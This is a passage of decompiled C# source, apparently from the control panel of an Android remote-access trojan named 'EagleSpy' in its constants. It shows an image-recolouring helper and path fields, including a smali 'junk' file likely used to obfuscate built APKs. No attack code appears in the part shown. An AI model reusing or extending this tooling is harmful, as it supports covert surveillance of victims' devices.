					graphics2.DrawImage(reso.RECOLOR(image, Color.FromArgb(190, 190, 190), color2), Conversions.ToInteger(parm[1]), Conversions.ToInteger(parm[2]), Conversions.ToInteger(parm[3]), Conversions.ToInteger(parm[4]));
				}
				result = new Bitmap(bitmap2);
			}
			return result;
		}
	}

	// Token: 0x0600077C RID: 1916 RVA: 0x000B23CC File Offset: 0x000B05CC
	private static Color getClr()
	{
		return SpySettings.DefaultColor_Foreground;
	}

	// Token: 0x0600077D RID: 1917 RVA: 0x000B23E0 File Offset: 0x000B05E0
	public static Bitmap RECOLOR(Image image, Color baseColor, Color newColor)
	{
		float[][] array = new float[5][];
		int num = 0;
		float[] array2 = new float[5];
		array2[0] = 1f;
		array[num] = array2;
		int num2 = 1;
		float[] array3 = new float[5];
		array3[1] = 1f;
		array[num2] = array3;
		int num3 = 2;
		float[] array4 = new float[5];
		array4[2] = 1f;
		array[num3] = array4;
		int num4 = 3;
		float[] array5 = new float[5];
		array5[3] = 1f;
		array[num4] = array5;
		array[4] = checked(new float[]
		{
			(float)(newColor.R - baseColor.R) / 255f,
			(float)(newColor.G - baseColor.G) / 255f,
			(float)(newColor.B - baseColor.B) / 255f,
			0f,
			1f
		});
		ColorMatrix colorMatrix = new ColorMatrix(array);
		ImageAttributes imageAttributes = new ImageAttributes();
		imageAttributes.SetColorMatrix(colorMatrix);
		Bitmap bitmap = new Bitmap(image.Width, image.Height);
		using (Graphics graphics = Graphics.FromImage(bitmap))
		{
			graphics.DrawImage(image, new Rectangle(0, 0, image.Width, image.Height), 0, 0, image.Width, image.Height, GraphicsUnit.Pixel, imageAttributes);
		}
		return bitmap;
	}

	// Token: 0x04000AA8 RID: 2728
	public static Font FontDrawString = null;

	// Token: 0x04000AA9 RID: 2729
	public static Font f = null;

	// Token: 0x04000AAA RID: 2730
	public static readonly string MY_Path = Application.StartupPath + "\\";

	// Token: 0x04000AAB RID: 2731
	public static readonly string res_Path = Application.StartupPath + "\\res";

	// Token: 0x04000AAC RID: 2732
	public static readonly string res_Path_iconsapps = Application.StartupPath + "\\res\\Icons\\Apps";

	// Token: 0x04000AAD RID: 2733
	public static readonly string Storepath = Application.StartupPath + "\\res\\Store";

	// Token: 0x04000AAE RID: 2734
	public static readonly string Junkpath = Application.StartupPath + "\\res\\Lib\\junk.smali";

	// Token: 0x04000AAF RID: 2735
	public static readonly string CrashsPath = Application.StartupPath + "\\res\\ClientCrashs";

	// Token: 0x04000AB0 RID: 2736
	public static readonly string domen = "plugens.angel.plugens";

	// Token: 0x04000AB1 RID: 2737
	public static readonly string users = "Users";

	// Token: 0x04000AB2 RID: 2738
	public static readonly string nameRAT = "EagleSpy";

	// Token: 0x04000AB3 RID: 2739
	public static StringBuilder maps;

	// Token: 0x04000AB4 RID: 2740
	public static List<object> plug;

	// Token: 0x04000AB5 RID: 2741
	public static string SupportedText;

	// Token: 0x04000AB6 RID: 2742
	public static string SupportedImages;

	// Token: 0x04000AB7 RID: 2743
	public static string SupportedVideo;
}
